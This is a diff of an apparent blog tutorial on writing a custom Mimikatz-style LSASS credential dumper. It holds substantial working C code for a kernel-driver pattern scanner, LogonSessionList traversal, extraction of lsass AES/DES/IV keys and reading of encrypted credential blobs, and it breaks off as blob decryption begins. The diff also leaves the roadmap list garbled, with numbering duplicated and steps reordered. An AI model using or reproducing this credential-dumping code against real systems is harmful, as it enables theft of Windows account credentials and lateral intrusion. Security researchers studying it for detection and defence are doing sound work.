@@ -1,4 +1,3 @@
-# Mimikatz for Dummies
 
 Before getting into this article I want to shoutout these resources particular that made this project possible:
 *  [Maldev Academy](https://maldevacademy.com/)
@@ -478,16 +477,16 @@ With this `hTarget` now contains a `HANDLE` to lsass.exe!
 
 If you're still here, thank you for your time.  If you skipped down here, you're smarter then me when I started this project and I applaud you :)
 
-Heres the general roadmap on what we need to do:
+Here is the general roadmap on what we need to do:
 1. Create driver ✔️
 2. Load driver ✔️
 3. Unprotect lsass ✔️
 4. Get lsass process handle ✔️
-5. Find lsasrv.dll in lsass memory space
+5. Find lsasrv.dll in lsass memory space 
 6. Find `LogonSessionList` pattern match address in lsasrv.dll
-7. Find AES/DES/IV Key pattern match address in lsasrv.dll
-8. Read through LogonSessionList for encrypted security blobs
-9. Extract AES / DES / IV Keys
+7. Find AES/DES/IV Key pattern match address in lsasrv.dll 
+8. 9. Extract AES / DES / IV Keys
+9. Read through LogonSessionList for encrypted security blobs
 10. Decrypt encrypted security blob
 11. MONEY!
 
@@ -806,9 +805,9 @@ Now that we've found lsasrv.dll comes the fun part, extracting credentials! Lets
 4. Get lsass process handle ✔️
 5. Find lsasrv.dll in lsass memory space ✔️
 6. Find `LogonSessionList` pattern match address in lsasrv.dll
-7. Find AES/DES/IV Key pattern match address in lsasrv.dll
-8. Read through LogonSessionList for encrypted security blobs
-9. Extract AES / DES / IV Keys
+7. Find AES/DES/IV Key pattern match address in lsasrv.dll.
+8. 9. Extract AES / DES / IV Keys
+9. Read through LogonSessionList for encrypted security blobs
 10. Decrypt encrypted security blob
 11. MONEY!
 
@@ -1023,5 +1022,854 @@ We're retruning that `Patterns` struct displayed just above,  The base and and e
 
 On this side of the kernel, all we do is send an IOCTL to our driver and wait for pointers back.
 
-### Kernelland Code
+### Kernel Code
 
+We send the IOCTL to our driver, now we need to search for the pattern.  Like mentioned above I'm storing the patterns in the driver:
+
+```c
+struct Patterns {
+	PVOID LogonSessionListPattern;
+	PVOID KeysPattern;
+};
+```
+
+
+First we define a function that accepts an upper and a lower bound for memory to search for the patterns.
+
+```c
+Patterns patternScanner(PVOID pBase, PVOID pEnd) {
+	Patterns ReturnPatternPointers = { 0 };
+	typedef struct {
+		UCHAR* bytes;
+		size_t length;
+	} BytePattern;
+	UCHAR LslPattern[12] = { 0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74 };
+	UCHAR keyPattern[16] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
+	BytePattern BytePatterns[] = {
+		{LslPattern,sizeof(LslPattern)},
+		{keyPattern,sizeof(keyPattern)}
+	};
+```
+
+
+Then with our patterns defined and held inside of the struct, we need to start looking through memory.
+
+First we setup a for loop to search through the number of patterns that we have:
+
+```c
+for (int i = 0;i<sizeof(BytePatterns)/sizeof(BytePatterns[0]);i++){
+```
+
+The next for loop is what searches through actual memory.  We need to setup a holder for the current pattern within the `Patterns` struct that we're looking for
+
+```c
+	size_t patternLength = BytePatterns[i].length;
+	PUCHAR pattern = BytePatterns[i].bytes;
+```
+
+THen with the pattern and the pattern length, we start looping through memory.  Here is what for loop looks like:
+
+```c
+	for (UCHAR* chunkStart = start; chunkStart + patternLength <= end; chunkStart += (CHUNK_SIZE - (patternLength - 1))) {
+		size_t remaining = end - chunkStart;
+	
+		size_t scanSize;
+	
+		if (remaining < CHUNK_SIZE)
+			scanSize = remaining;
+		else
+			scanSize = CHUNK_SIZE;
+	
+	
+		if (scanSize < patternLength) break; // nothing left to scan
+```
+
+We start at our starting base address that was passed into the function.  That value is then stored in `chunkStart`.  Then we start by adding the `patternLength` and check to make sure that we're within our upper memory address limit `end` which is passed to the function. Then increment our `chunkStart` variable by `CHUNK_SIZE - (patternLength - 1))` which  brings us within 1 patternLength of the end of the chunk.
+
+Then we create the `remaining` which is the remaining number of bytes of memory to search.  If the bytes remaining is less then our `CHUNK_SIZE` then that just becomes the `CHUNK_SIZE`, otherwise we're just going to search a standard chunk.  If the scanSize is less then the patternLength then we know that it cant contain the pattern.
+
+`scanSize` is the number of bytes that we have left to search in this chunk.
+
+Then we enter a try exception sequence that searches through the chunk incrementing by one byte each time, but using the `compareN` function to search the next `patternLength` amount of bytes and see if they're equal to the pattern bytes. 
+
+```c
+	__try {
+		for (size_t j = 0; j <= scanSize - patternLength; j++) {
+			if (compareN(chunkStart + j,pattern, patternLength)) {
+				debug_printer("FOUND IT! Setting offset....\n");
+
+				ULONG_PTR address = (ULONG_PTR)(chunkStart + j);
+				ULONG offset = (ULONG)(((UCHAR*)chunkStart + j) - (UCHAR*)pBase);
+				DbgPrint("Win1803 Location: 0x%p\n", (PVOID)address);
+				DbgPrint("Offset Location: 0x%llu\n", (unsigned long long)offset);
+
+				if (i == 0) {
+					ReturnPatternPointers.LogonSessionListPattern = (PVOID)address;
+				}
+				else if (i == 1) {
+					ReturnPatternPointers.KeysPattern = (PVOID)address;
+					return ReturnPatternPointers;
+				}
+			}
+		}
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		// Skip this chunk safely
+		debug_printer("Exception handler for pattern search...\n");
+	}
+KeShouldYieldProcessor(); // Yield CPU to avoid watchdog timeout
+}
+```
+
+If it is equal then based on which pattern we're looking for it saves the address in the returned `Pattern` structure.
+
+```c
+// Compare 12 bytes at base with pattern
+bool compareN(UCHAR* base, UCHAR* pattern, size_t length) {
+	for (int i = 0; i < length; i++) {
+		if (base[i] != pattern[i])
+			return false;
+	}
+	return true;
+}
+```
+
+My biggest issue writing this fucntion was watchdog issues that were resulting in bluescreens.  Some key takeaways for me:
+1. `KeShouldYieldProcessor()`- This function ends up telling the processor that this function can yield for other important processor functions.  This alone wont fix issues though
+2. `CHUNK_SIZE` - This breaks up the searching into more managable chunks, allowing the processor time in between to take care of actions and avoid any watchdog issues.
+
+
+Now we have the memory address of our patterns for LogonSessionList and the keys base!
+
+
+## FInd LogonSessionList
+
+Now with our pattern we can find the actual LogonSessionList structure. We discussed this in Windbg above so now its time to implement that in C code.
+
+```c
+Patterns bytePatterns
+bytePatterns = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
+```
+
+We can access the LogonSessionList pattern through `bytePatterns.pLogonSessionListPattern`.
+
+```c
+pLsl = bytePatterns.pLogonSessionListPattern;
+pKeysBase = bytePatterns.pKeysPattern;
+```
+
+Then from here we apply a `0x14` offset from the pattern match address that brings us back up to the `lea` instruction:
+
+![[Pasted image 20250902214235.png]]
+![[Pasted image 20250903191427.png]]
+
+```c
+
+PVOID pLslActual = (PVOID)((BYTE*)pLsl + 0x14); //offset to 00007ffd`fc17e398 488d0d915b1200  lea     rcx,[lsasrv!LogonSessionList (00007ffd`fc2a3f30)] lea instruction to retr address
+```
+You can see the instruction in memory with each of the assembly instructions underlined in a different color, followed by the offset that we're looking for thaat will yield the LogonSessionList highlighted in yellow:
+![[Pasted image 20250903191652.png]]
+
+```
+488d0d = Assembly bytes
+915b1200 = Offset
+```
+
+So with that we search for the assembly bytes and once we have them extract the offset/`disp32`:
+
+```c
+if (!ReadProcessMemory(hTarget, pLslActual, leaBytes, sizeof(leaBytes), &bytesRead) || bytesRead != sizeof(leaBytes)) {
+	printf("Failed to read remote memory. Error: %lu\n", GetLastError());
+	CloseHandle(hTarget);
+	return 1;
+}
+if (bytesRead == sizeof(leaBytes) && leaBytes[0] == 0x48 && leaBytes[1] == 0x8D && leaBytes[2] == 0x0D) {
+	// extract displacement
+	int32_t disp32 = *(int32_t*)&leaBytes[3];
+
+```
+
+but remember that the offset is applied from the NEXT instruction so we have to add 7 bytes:
+
+```c
+	// next instruction is leaAddr + 7
+	UINT64 nextInstr = (UINT64)pLslActual + 7;
+```
+
+And that then allows us to find the `LogonSessionList` address which we store inside of `target`. then shift to `pLogonSessoin`
+```c
+	target = nextInstr + disp32;
+
+	printf("RIP-relative target = 0x%llx\n", target); //i need to learn how this shit works like actually cos this is so confusing.
+}
+
+printf("Offset of Credentials = 0x%zx\n",offsetof(KIWI_MSV1_0_LIST_63, Credentials)); //offset A0?
+
+PVOID pLogonSessionList = (PVOID)(uintptr_t)target;
+```
+
+## Credentials Extraction
+
+
+Now with the `LogonSessionList` we get into the meat of Mimikatz, and this project.  Finding out where the credentials are stored, and parsing them out.  Lets go back to the `PKIWI_MSV1_0_LIST_63`.
+
+```c
+typedef struct _KIWI_MSV1_0_LIST_63 {
+    struct _KIWI_MSV1_0_LIST_63* Flink;
+    struct _KIWI_MSV1_0_LIST_63* Blink;
+    PVOID unk0;
+    ULONG unk1;
+    PVOID unk2;
+    ULONG unk3;
+    ULONG unk4;
+    ULONG unk5;
+    HANDLE hSemaphore6;
+    PVOID unk7;
+    HANDLE hSemaphore8;
+    PVOID unk9;
+    PVOID unk10;
+    ULONG unk11;
+    ULONG unk12;
+    PVOID unk13;
+    LUID LocallyUniqueIdentifier;
+    LUID SecondaryLocallyUniqueIdentifier;
+    UCHAR waza[12];
+    LSA_UNICODE_STRING UserName;
+    LSA_UNICODE_STRING Domaine;
+    PVOID unk14;
+    PVOID unk15;
+    LSA_UNICODE_STRING Type;
+    PSID pSid;
+    ULONG LogonType;
+    PVOID unk18;
+    ULONG Session;
+    LARGE_INTEGER LogonTime;
+    LSA_UNICODE_STRING LogonServer;
+    KIWI_MSV1_0_CREDENTIALS* Credentials;
+    PVOID unk19;
+    PVOID unk20;
+    PVOID unk21;
+    ULONG unk22;
+    ULONG unk23;
+    ULONG unk24;
+    ULONG unk25;
+    ULONG unk26;
+    PVOID unk27;
+    PVOID unk28;
+    PVOID unk29;
+    PVOID CredentialManager;
+} KIWI_MSV1_0_LIST_63, * PKIWI_MSV1_0_LIST_63;
+```
+
+The treasure trove is located within `KIWI_MSV1_0_CREDENTIALS* Credentials`.  But lets not forget that we dont actually have this entire struct in our local process's memory right now, we simply have a pointer to it in lsass's memory.
+
+So the first thing we need to do is get this struct inside of our processes memory so we can view its elements:
+
+```c
+
+void userlandExtraction(HANDLE hTarget, PVOID pLogonSessionList) {
+	// Step 1: read the head pointer (points into LSASS memory)
+	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
+	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
+		printf("[-] Failed to read head pointer\n");
+		return;
+	}
+```
+
+From here we now have the pointer to the LogonSessionList stored inside of `headPtr`.  We dont have the actual structure yet so we need to read the memory at that pointer's address to get access to the struct:
+
+```c
+	// Step 2: read the head node structure
+	KIWI_MSV1_0_LIST_63 head = { 0 };
+	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
+		printf("[-] Failed to read head struct\n");
+		return;
+	}
+```
+
+
+Now with the list we can start iterating through it very similarly to the rest of the `LIST_ENTRY` structures we were looking at earlier.  We'll setup another pointer to another list structure and set that equal to the next entry in the list with `head.Flink` and then we can start looping through all of the list entries:
+
+```c
+	// Step 3: iterate the linked list
+	PKIWI_MSV1_0_LIST_63 current = head.Flink;
+	while (current && current != headPtr) {
+		KIWI_MSV1_0_LIST_63 node = { 0 };
+		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
+			printf("[-] Failed to read node @ %p\n", current);
+			break;
+		}
+		printf("KIWI STRUCT 0x%p\n", node);
+		printf("Username Buffer 0x%p", node.UserName.Buffer);
+
+```
+
+Inside the while loop once we ensure that our current place in the list is not pointing back to the start, we can read the contents of that list entry and store it in `node`.
+
+THIS is what grants us access to the struct we talked about earlier.  From here we can parse out usernames, domains, times, ect.  
+
+One thing to keep in mind, is that the username is not actually stored within this structure however, only a pointer to the buffer containing the usernames and domains.  So we read the pointer for the current list entries' username and then store that inside of a buffer that we can print:
+
+```c
+printf("KIWI STRUCT 0x%p\n", node);
+printf("Username Buffer 0x%p", node.UserName.Buffer);
+
+// Step 4: read the username if present
+if (node.UserName.Buffer && node.UserName.Length > 0) {
+	wchar_t buffer[256] = { 0 };
+	SIZE_T bytesToRead = min(node.UserName.Length, sizeof(buffer) - sizeof(wchar_t));
+
+	if (ReadProcessMemory(hTarget, node.UserName.Buffer, buffer, bytesToRead, NULL)) {
+		// Length is in bytes, so divide by sizeof(WCHAR)
+		wprintf(L"[+] Username: %.*s\n", node.UserName.Length / sizeof(WCHAR), buffer);
+	}
+	else {
+		printf("[-] Failed to read username buffer @ %p\n", node.UserName.Buffer);
+	}
+
+}
+else {
+	printf("[*] NO USERNAME\n");
+}
+```
+
+Finally we just need to advance the list with 
+
+```c
+	// Step 5: advance
+	current = node.Flink;
+```
+
+This provides an example of just printing out the usernames.  Thats not what we're after though. What we need is the security blob.
+
+## Security Blob
+
+The security blob is contained within the `KIWI_MSV1_0_CREDENTIALS` structure:
+
+```c
+typedef struct _KIWI_MSV1_0_CREDENTIALS {
+	struct _KIWI_MSV1_0_CREDENTIALS *next;
+	DWORD AuthenticationPackageId;
+	PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
+} KIWI_MSV1_0_CREDENTIALS, *PKIWI_MSV1_0_CREDENTIALS;
+```
+
+User hashes are stored within the `PrimaryCredentials` variable which is contained within the `PKIWI_MSV1_0_PRIMARY_CREDENTIALS` structure.
+
+
+```c
+typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
+	struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS *next;
+	ANSI_STRING Primary;
+	LSA_UNICODE_STRING Credentials;
+} KIWI_MSV1_0_PRIMARY_CREDENTIALS, *PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
+```
+
+The encrypted hashes are finally contained within the `LSA_UNICODE_STRING`.
+
+```c
+typedef struct _LSA_UNICODE_STRING {
+	USHORT Length; // Length of the string in bytes (excluding null terminator)
+	USHORT MaximumLength; // Total allocated size in bytes for the buffer
+	PWSTR Buffer; // Pointer to the wide-character string
+} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;
+```
+
+So to recount our steps so far:
+1. Create driver ✔️
+2. Load driver ✔️
+3. Unprotect lsass ✔️
+4. Get lsass process handle ✔️
+5. Find lsasrv.dll in lsass memory space ✔️
+6. Find `LogonSessionList` pattern match address in lsasrv.dll✔️
+7. Find AES/DES/IV Key pattern match address in lsasrv.dll 
+8. 9. Extract AES / DES / IV Keys
+9. Read through LogonSessionList for encrypted security blobs
+10. Decrypt encrypted security blob
+11. MONEY!
+
+## Finding Encryption Keys
+
+Mimikatz has two types of encryption for their security blobs, AES and DES. Adam Chester's [article]([Exploring Mimikatz - Part 1 - WDigest - XPN InfoSec Blog](https://blog.xpnsec.com/exploring-mimikatz-part-1/)) and [code]([wdigest_extract_dllversion.c](https://gist.github.com/xpn/12a6907a2fce97296428221b3bd3b394)) explains the reverse engineering process he used to make this discovery extremely well.  In order to decrypt the security blob we need to find the AES, DES, and IV keys.  In order to find these keys we need to find the `KIWI_HARD_KEY` for both AES and DES.
+
+```c
+typedef struct _KIWI_HARD_KEY {
+    ULONG cbSecret;
+    BYTE data[60]; // etc...
+} KIWI_HARD_KEY, * PKIWI_HARD_KEY;
+```
+
+How do we we find the `HARD_KEY`? This structure is nested within both the `KIWI_BCRYPT_HANDLE_KEY` and `KIWI_BCRYPT_KEY81`.  
+
+```c
+typedef struct _KIWI_BCRYPT_HANDLE_KEY {
+    ULONG size;
+    ULONG tag;	// 'UUUR'
+    PVOID hAlgorithm;
+    PKIWI_BCRYPT_KEY81 key;
+    PVOID unk0;
+} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;
+
+typedef struct _KIWI_BCRYPT_KEY81 {
+    ULONG size;
+    ULONG tag;	// 'MSSK'
+    ULONG type;
+    ULONG unk0;
+    ULONG unk1;
+    ULONG unk2;
+    ULONG unk3;
+    ULONG unk4;
+    PVOID unk5;	// before, align in x64
+    ULONG unk6;
+    ULONG unk7;
+    ULONG unk8;
+    ULONG unk9;
+    KIWI_HARD_KEY hardkey; <===TARGET!!
+} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;
+```
+
+So the question then becomes, how do we find the `PKIWI_BCRYPT_KEY81`?  That is where the pattern search we performed earlier when we found the LogonSessionList pointer comes into play.
+
+Using Adam Chester's article we can load lsasrv.dll into Ghidra and search its memory for the pattern
+
+```c
+UCHAR keyPattern[16] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
+--
+83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15
+```
+
+```
+Memory Search Hotkey = s 
+```
+![[Pasted image 20250830220502.png]]
+
+Adam Chester was able to discover that `DAT_180195420` is relative offset to an AES handle. For clarity we can rename this to `hAESKeyHandle`.
+
+Then we can look at references to this object.  We clearly see it being used in BCrypt encryption routines
+
+```
+R Click > References > Show References to hAESKeyHandle
+or 
+Cntrl + Shift + F 
+```
+![[Pasted image 20250903211131.png]]
+
+This shows us other times that the code calls or uses this object.  The first finding is of particular note as it clearly depicts BCrypt encryption routines
+
+![[Pasted image 20250903211311.png]]
+
+![[Pasted image 20250830220844.png]]
+
+Examining the inputs going into the Bcrypt function on the right lets us fill out a couple more labels until we eventually find the DES key handle offset, and algorithm handles as well.
+
+![[Pasted image 20250903211737.png]]
+
+The blue box represents the address in memory that our pattern searching function is going to return.  We need to write code that takes us from the blue box, up to the red boxes.  Thankfully Mimikatz has helped out with this process as well!
+
+The pattern search address simply provides a reliable place within close range of both our handles, that we can then apply another offset to.
+
+[Mimkatz File]([mimikatz/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c at 152b208916c27d7d1fc32d10e64879721c4d06af · gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c#L9)
+![[Pasted image 20250903212639.png]]
+These are build specific, just like the pattern bytes.  One hugely important misunderstanding I had when working through this is that **the offset listed above, takes you to a relative offset to the key.  This does NOT take you to the key itself!**
+
+Now all that's left is to retrieve these handles:
+
+First we can make some definitions for the AES,DES, and IV offsets, and similar to the relative offsets we found for the LogonSessionList, more int32_t since relative offsets are stored in 32 bit pointers.
+```c
+#define IVOffset 67 //67
+#define AESKeyOffset 16//+16
+#define DESKeyOffset 89 //-89
+
+
+	int32_t hAesKeyOffset = 0; //what took me forever to realize is that this offset in mimikatz is not the KEY, its a relative offset to the KEY.
+	int32_t hDesKeyOffset = 0;
+	int32_t IVRelativeOffset = 0;
+```
+
+Now we need to read all the relative offsets to the key and store them in a place where we can pull the keys down later:
+
+```c
+size_t written = 0;
+//retr offset from pattern to pointer to key handle
+if(!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + AESKeyOffset), &hAesKeyOffset, sizeof(int32_t), &written)) {
+	printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+	return;
+}
+if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase - DESKeyOffset), &hDesKeyOffset, sizeof(int32_t), &written)) {
+	printf("Could not retr DES Offset to BCRYPT_KEY_HANDLE");
+	return;
+}
+if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + IVOffset), &IVRelativeOffset, sizeof(int32_t), &written)) {
+	printf("Could not retr DES Offset to BCRYPT_KEY_HANDLE");
+	return;
+}
+```
+
+
+Keep in mind that we're applying each types offset to the base address, and also dont forget that the DES address is negative.
+
+Then from here we can apply the relative offset from the next instruction, exactly like we did for the LogonSessionList.  
+
+```c
+
+	PKIWI_BCRYPT_HANDLE_KEY hAesKeyRemote = NULL;
+	PKIWI_BCRYPT_HANDLE_KEY hDesKeyRemote = NULL; // remote address of struct
+
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + AESKeyOffset + 4 + hAesKeyOffset), &hAesKeyRemote, sizeof(hAesKeyRemote), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase - DESKeyOffset + 4 + hDesKeyOffset), &hDesKeyRemote, sizeof(hDesKeyRemote), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + IVOffset + 4 + IVRelativeOffset), &IV, sizeof(IV), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	printf("AES Key Retr in LSASS @ 0x%p\n", hAesKeyRemote);
+	printf("DES Key Retr in LSASS @ 0x%p\n", hDesKeyRemote);
+```
+
+But why is this one only adding 4, and not 7 like last time? Here this is because the offset calculated by Mimikatz takes us up EXACTLY to the offset.
+
+What we see in ghidra and the unassembler is:
+
+```
+lea rdx, [rip + 0013bfef]
+-------------------------------------
+48 8d 15 [ ef bf 13 00 ] | [] = Where Mimikatz takes you
+```
+![[Pasted image 20250903214604.png]]
+
+And so we're adding 4 so that we just straight to the first index of the red box.  Keep in mind the endianness of whats written in the assembler versus the interpreted version, hence why it may look out of order at first glance.
+
+When we were finding LogonSessionList our code would find the offset by treating the entire assembly code as an array, but skipping over the first 3 opcodes.  Then it would apply the offset to the beggining since it wasnt storing any addresses between the opcodes and the relative address.
+
+So now that we have our relative address we have the full pointer to our key objects  at `((BYTE*)pKeyBase + IVOffset + 4 + IVRelativeOffset)`.
+
+We read that address and have the structures in local memory now.
+
+```c
+	//read pointer to remote key handle -> local memory
+	KIWI_BCRYPT_HANDLE_KEY hAesKeyHandlLocal;
+	KIWI_BCRYPT_HANDLE_KEY hDesKeyHandleLocal;
+	if (!ReadProcessMemory(hTarget, hAesKeyRemote, &hAesKeyHandlLocal, sizeof(hAesKeyHandlLocal), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+	if (!ReadProcessMemory(hTarget, hDesKeyRemote, &hDesKeyHandleLocal, sizeof(hDesKeyHandleLocal), &written)) {
+		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
+		return;
+	}
+```
+
+And now we need to go within this structure to find the `KIWI_BCRYPT_KEY81` so we can eventually find the `KIWI_HARD_KEY`
+
+Keep in mind that the `KIWI_BCRYPT_HANDLE_KEY` structure just stores a pointer to `KIWI_BCRYPT_KEY81` so we read that memory address and pull it back into local memory.
+
+
+```c
+KIWI_BCRYPT_KEY81 aes81Key;
+KIWI_BCRYPT_KEY81 des81Key;
+
+
+if (!ReadProcessMemory(hTarget, hAesKeyHandlLocal.key, &aes81Key, sizeof(KIWI_BCRYPT_KEY81), &written)) {
+	printf("Could not retr AES81 Key");
+	return;
+}
+if (!ReadProcessMemory(hTarget, hDesKeyHandleLocal.key, &des81Key, sizeof(KIWI_BCRYPT_KEY81), &written)) {
+	printf("Could not retr AES81 Key");
+	return;
+}
+```
+
+And now the `KIWI_BCRYPT_KEY81` has the entire `KIWI_HARD_KEY` structure stored within it, not another pointer.  This means we can directly reference it now that its in local memory.
+
+```c
+BYTE AESKeyBytes[AESKeySize]; // should this be sized to cbSecret?
+BYTE DESKeyBytes[DESKeySize];
+
+memcpy(AESKeyBytes, aes81Key.hardkey.data,aes81Key.hardkey.cbSecret);
+memcpy(DESKeyBytes, des81Key.hardkey.data, des81Key.hardkey.cbSecret);
+
+//memcpy(DESKeyBytes, des81Key.hardkey.data, des81Key.hardkey.cbSecret);
+
+//now we should have the AES & DES Keys
+
+printKeyBytes(AESKeyBytes, aes81Key.hardkey.cbSecret, "AES KEY");
+printKeyBytes(DESKeyBytes, des81Key.hardkey.cbSecret, "DES KEY");
+printKeyBytes(IV, sizeof(IV), "Initialization Vector");
+
+//printKeyBytes(DESKeyBytes, des81Key.hardkey.cbSecret, "DES KEY");
+
+memcpy(keysOut->AESKey, AESKeyBytes, aes81Key.hardkey.cbSecret);
+memcpy(keysOut->DESKey, DESKeyBytes, des81Key.hardkey.cbSecret);
+memcpy(keysOut->IVKey, IV, sizeof(IV));
+
+keysOut->AESKeyLen = AESKeySize;
+keysOut->DESKeyLen = DESKeySize;
+keysOut->IVKeyLen = sizeof(IV);
+
+```
+
+Here is where we're at:
+1. Create driver ✔️
+2. Load driver ✔️
+3. Unprotect lsass ✔️
+4. Get lsass process handle ✔️
+5. Find lsasrv.dll in lsass memory space ✔️
+6. Find `LogonSessionList` pattern match address in lsasrv.dll✔️
+7. Find AES/DES/IV Key pattern match address in lsasrv.dll ✔️
+8. 9. Extract AES / DES / IV Keys✔️
+9. Read through LogonSessionList for encrypted security blobs
+10. Decrypt encrypted security blob
+11. MONEY!
+
+Just a little bit more everyone!
+## Reading Security Blobs
+
+We looped through the LogonSessionList when we printed usernames, so we're going to use a very similar process.  If this part still confuses you, I recommend re-reading that section or checking out the pykd article linked above!
+
+The only difference in this first part is that we're finding our keys, which we just talked about above.
+
+```c
+
+void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList, PVOID pKeysBase) {
+
+
+	ENC_KEYS keys = { 0 };
+	findKeys(hTarget, pKeysBase, &keys);
+
+
+	// Step 1: read the head pointer (points into LSASS memory)
+	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
+	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
+		printf("[-] Failed to read head pointer\n");
+		return;
+	}
+
+	// Step 2: read the head node structure
+	KIWI_MSV1_0_LIST_63 head = { 0 };
+	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
+		printf("[-] Failed to read head struct\n");
+		return;
+	}
+	// Step 3: iterate the linked list
+	PKIWI_MSV1_0_LIST_63 current = head.Flink;
+	while (current && current != headPtr) {
+		KIWI_MSV1_0_LIST_63 node = { 0 };
+		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
+			printf("[-] Failed to read node @ %p\n", current);
+			break;
+		}
+		printf("\n\nLOCAL KIWI STRUCT 0x%p\n", &node);
+```
+
+We pull retrieve our LogonSessionList pointer from remote memeory, and store it locally.  Then we read the LogonSessionList head at that remote memory address and store it locally.  Then save the head list address, and begin looping through all of the different LogonSessionList entries.
+
+Now we can access the pointer to the `KIWI_MSV1_0_CREDENTIALS Credentials` so we pull that
+
+```c
+printf("Attempting to read security blob\n");
+if (node.Credentials) { // base + 0x108
+	printf("Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
+	KIWI_MSV1_0_CREDENTIALS Credentials = { 0 };
+	if (ReadProcessMemory(hTarget, node.Credentials, &Credentials, sizeof(KIWI_MSV1_0_CREDENTIALS), NULL)) { //place struct in at this address
+		printf("REMOTE Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
+		printf("local Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", &Credentials);
+
+		//read local address for new pointer
+		PKIWI_MSV1_0_PRIMARY_CREDENTIALS pPrimaryCredentials = Credentials.PrimaryCredentials;
+		KIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials = { 0 };
+		getchar();
+```
+
+With the `KIWI_MSV1_0_CREDENTIALS` structure we can get a remote pointer to the `KIWI_MSV1_0_PRIMARY_CREDENTIALS` structure so we pull that and store the pointer inside of `pPrimaryCredentials`.  We also initialize a new struct to hold the contents of that struct once we read it here:
+
+```c
+	if (ReadProcessMemory(hTarget, pPrimaryCredentials, &PrimaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), NULL)) {
+					LSA_UNICODE_STRING LsaUnicodeString = PrimaryCredentials.Credentials;
+```
+
+Now we have a local copy of lsass's `KIWI_MSV1_0_PRIMARY_CREDENTIALS` structure.  This contains the `LSA_UNICODE_STRING` structure which has a remote pointer in lsass to the encrypted blob, so we read lsass's memory for the encrypted blob.
+
+```c
+	if (LsaUnicodeString.Length > 0 && LsaUnicodeString.Buffer) {
+					SIZE_T blobSize = LsaUnicodeString.Length; // already in bytes
+					BYTE* blob = (BYTE*)malloc(blobSize);
+					if (blob) {
+						if (ReadProcessMemory(hTarget, LsaUnicodeString.Buffer, blob, blobSize, NULL)) {
+							printf("[+] Security Blob (%llu bytes)\n", (unsigned long long)blobSize);
+```
+
+For debugging purposes you can print out the hex, it makes it easy to tell once you have a decrypted blob and actually pull out useful data.
+
+Then we just need to decrypt the blob.
+
+```c
+								// Optionally print as hex
+								for (SIZE_T i = 0; i < blobSize; i++)
+									printf("%02X ", blob[i]);
+								printf("\n");
+
+								printf("Entering Decrypt routine...\n");
+								decryptBlob(blob, blobSize, keys);
+```
+
+## Blob Decryption
+
+Like we saw earlier, we know that BCrypt is the primary cryptograph driver of lsass's credentials stored in memory.  We even saw the different algorithms and BCrypt properties used by lsass in Ghidra.
+
+![[Pasted image 20250903221846.png]]
+
+Here's what we know based on the decomplication of lsasrv.dll
+
+**[BCryptSetProperty]([BCryptSetProperty function (bcrypt.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptsetproperty)):**
+
+| Field                                                                                                                                     | AES               | 3DES              |
+| ----------------------------------------------------------------------------------------------------------------------------------------- | ----------------- | ----------------- |
+| [Cryptography Primitive Property Identifier (Bcrypt.h) ](https://learn.microsoft.com/en-us/windows/win32/SecCNG/cng-property-identifiers) | Chaining Mode CFB | Chaining Mode CBC |
+
+The other unique thing that Adam Chester discovered, is when each algorithm is used. He was able to determine that AES is used when the length of the security blob is divisible by 8, AES is used.
+
+So now we can start writing code:
+
+```c
+
+void decryptBlob(const BYTE* blob, SIZE_T blobLen, ENC_KEYS keys) {
